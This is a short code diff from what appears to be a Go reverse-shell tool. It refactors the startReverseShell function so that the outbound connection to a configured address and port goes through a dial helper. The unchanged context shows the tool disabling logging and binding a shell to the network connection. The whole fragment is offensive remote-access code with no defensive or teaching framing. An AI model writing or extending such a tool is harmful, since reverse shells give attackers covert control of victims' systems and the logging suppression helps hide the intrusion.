@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"io"
 	"net"
 	"os"
@@ -20,8 +19,7 @@ func startReverseShell(config Config) {
 		disableLogging()
 	}
 
-	host := fmt.Sprintf("%s:%d", config.Addr, config.Port)
-	conn, err := net.Dial(config.Protocol, host)
+	conn, err := dial(config)
 	check(err)
 
 	stdin := startShell(config.Path, conn)
